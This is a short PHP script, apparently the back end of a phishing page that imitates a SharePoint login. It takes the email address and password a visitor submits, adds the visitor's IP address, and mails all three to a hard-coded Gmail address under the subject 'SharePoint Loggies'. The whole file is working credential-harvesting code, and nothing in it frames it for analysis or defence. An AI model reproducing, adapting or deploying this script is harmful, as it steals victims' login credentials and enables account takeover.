<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $amu= $_POST['email'];
 $otu = $_POST['password'];
 
		$omeka = "carnagiemelissa@gmail.com";
		
		
         $ishiozi = "SharePoint Loggies : $ip";
		 
		 $ozi =  "Email ID            : ".$amu."\r\n";
         $ozi .= "Password           : ".$otu."\r\n";
		 $ozi .= "IP           : ".$ip."\r\n";
		$header = "No More Sapa: Ji Masun \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($omeka,$ishiozi,$ozi,$header);

}
?>
